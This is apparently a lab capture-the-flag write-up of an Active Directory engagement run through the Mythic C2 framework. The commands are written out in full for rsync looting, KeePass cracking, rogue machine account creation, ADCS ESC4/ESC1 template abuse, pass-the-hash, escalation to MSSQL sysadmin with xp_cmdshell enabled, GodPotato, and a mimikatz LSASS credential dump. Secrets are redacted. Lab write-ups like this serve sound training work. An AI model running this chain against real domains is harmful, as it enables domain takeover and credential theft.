Target : mythical.htb

Date : 14/06/2026 - 23/06/2026

This is a `VulnLab Pro Lab` engagement with `Mythic` as the command framework.
The environment is a dual-forest `Active Directory` setup where the main work is done from the already planted `Apollo` callback on `MYTHICAL-US`.
The chain used here is :

`rsync` misconfiguration -> `KeePass` credential recovery -> `ADCS ESC4/ESC1` -> `SYSTEM` on US DC -> EU share pivot -> `MSSQL db_owner + TRUSTWORTHY` -> `GodPotato` -> `LSASS WDigest`.

All `flags`, `hashes`, and sensitive secrets are redacted.

```bash
>  nmap -sC -sV -O -Pn -p- --min-rate=3000 -T4 10.13.38.32
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-14 15:02 +0200
Nmap scan report for mythical.htb (10.13.38.32)
Host is up (0.051s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu
80/tcp   open  http    Golang net/http server
7443/tcp open  ssl/http nginx
|_ssl-cert: Subject: O=Mythic
```

The important point is `7443` with `Mythic`.
The web login gives access to an existing callback on `DC01` as `MYTHICAL-US\\Momo.Ayase`.

```text
whoami
mythical-us\momo.ayase
```

From there the first lane is internal `rsync`.

```cmd
C:\_admin\cwrsync\bin\rsync.exe --list-only rsync://192.168.25.1/
C:\_admin\cwrsync\bin\rsync.exe --list-only rsync://192.168.25.1/mythical
```

The path has `_admin` and not `admin`.
After pulling the share:

```cmd
cd /d C:\temp
C:\_admin\cwrsync\bin\rsync.exe -av rsync://192.168.25.1/mythical .
type flag.txt
<REDACTED_FLAG_1>
```

The next lane is `KeePass`.
`it.kdbx` is downloaded from the callback workspace and cracked offline with `rockyou`.

```bash
>  /tmp/keepass4brute/keepass4brute.sh /tmp/mythical/it.kdbx /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
[+] Password found: <REDACTED_KEEPASS_MASTER_PASSWORD>
```

Entries include a `domjoin` account with domain join rights.
That account is used to create a controlled machine account for the cert template abuse path.

```powershell
$pass = ConvertTo-SecureString '<REDACTED_MACHINE_PASSWORD>' -AsPlainText -Force
$cred = New-Object pscredential('mythical-us\domjoin', $pass)
New-ADComputer -Name 'EVILPC' -SamAccountName 'EVILPC$' -AccountPassword (ConvertTo-SecureString '<REDACTED_MACHINE_PASSWORD>' -AsPlainText -Force) -Credential $cred -Enabled $true
```

With `EVILPC$`, template rights are modified (`ESC4`) and then turned into an authentication template (`ESC1` shape).

```powershell
Add-DomainObjectAcl -Credential $cred -TargetIdentity Machine -PrincipalIdentity "Domain Users" -RightsGUID "0e10c968-78fb-11d2-90d4-00c04f79dc55" -TargetSearchBase "LDAP://CN=Configuration,DC=mythical-us,DC=vl"
Set-DomainObject -Credential $cred -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=mythical-us,DC=vl" -Identity Machine -XOR @{'mspki-certificate-name-flag'=1} -Verbose
Set-DomainObject -Credential $cred -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=mythical-us,DC=vl" -Identity Machine -Set @{'mspki-certificate-application-policy'='1.3.6.1.5.5.7.3.2'} -Verbose
```

Then `Certify` is executed through Mythic and requests a cert with `Administrator@mythical-us.vl` as altname.
The returned material is converted to `pfx`, uploaded back, and used with Kerberos tooling.
This yields administrator-level credential material (`NTLM` redacted).

```text
<REDACTED_ADMIN_NTLM_HASH>
```

`Invoke-SMBExec` is used for local pass-the-hash execution on the US DC.
That spawns a new callback as `NT AUTHORITY\SYSTEM`.

```powershell
Import-Module .\Invoke-SMBExec.ps1
Invoke-SMBExec -Target 127.0.0.1 -Domain mythical-us.vl -Username administrator -Hash <REDACTED_ADMIN_NTLM_HASH> -Command "C:\ProgramData\google\update.exe"
```

From the `SYSTEM` callback:

```cmd
type C:\Users\Administrator\Desktop\flag.txt
<REDACTED_FLAG_2>
```

At this stage the trust between `MYTHICAL-US` and `MYTHICAL-EU` is enumerated, but a direct trust-ticket branch was retired.
The practical route was direct reachability from the dual-homed US DC to EU SMB resources.

```cmd
dir \\dc02.mythical-eu.vl\dev
copy \\dc02.mythical-eu.vl\dev\getusers.exe C:\Windows\Temp\getusers.exe
```

`getusers.exe` leaks hardcoded service credentials in strings output.
The same password appears for both `svc_ldap` and `svc_sql` (redacted below).

```text
mythical-eu\svc_ldap : <REDACTED_SHARED_SERVICE_PASSWORD>
mythical-eu\svc_sql  : <REDACTED_SHARED_SERVICE_PASSWORD>
```

`LDAP` proof is done first, then `MSSQL` escalation is done with integrated auth using token context (`make_token` + `powerpick`).
Direct `-U/-P` SQL auth was not the reliable branch here.

```sql
CREATE OR ALTER PROCEDURE dbo.xct WITH EXECUTE AS OWNER AS
  ALTER SERVER ROLE sysadmin ADD MEMBER [MYTHICAL-EU\svc_sql];
EXEC dbo.xct;
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
```

After that, tooling is staged from the US DC over a temporary share and copied to EU temp paths through `xp_cmdshell`.
`SeImpersonatePrivilege` on the SQL service account enables `GodPotato`, then `mimikatz` dumps `WDigest` credentials.

```cmd
C:\Windows\Temp\gp.exe -cmd "cmd /c C:\Windows\Temp\m.exe sekurlsa::logonpasswords exit > C:\Users\Public\mk.txt 2>&1"
type C:\Users\Public\mk.txt
...
root
  * Password : <REDACTED_ROOT_WDIGEST_PASSWORD>
```

The third lab flag is recovered from this final credential path:

```text
<REDACTED_FLAG_3>
```

The important scars from this run:

`C:\_admin\` path exactness mattered for `rsync`.
`make_token` context must be consumed by `powerpick` and not assumed in every command runner.
`C$` cross-domain copy failed; temporary share staging from the dual-homed host was the stable path.
The trust-ticket hypothesis was not needed on this instance; direct SMB + service creds gave the shorter route.
`root` flag material was tied to credential extraction context and not a guaranteed desktop file path branch.

Retired branches:

`Rubeus asktgt` trust path with machine principals returned `KDC_ERR_C_PRINCIPAL_UNKNOWN`.
operator-side `rpfwd` + external certipy branch was unstable here.
interactive `openssl pkcs12 -export` without explicit pass handling caused avoidable friction.

Final state:

US domain admin path completed.
EU privilege path completed.
All three lab milestones captured, all sensitive values redacted in this public version.
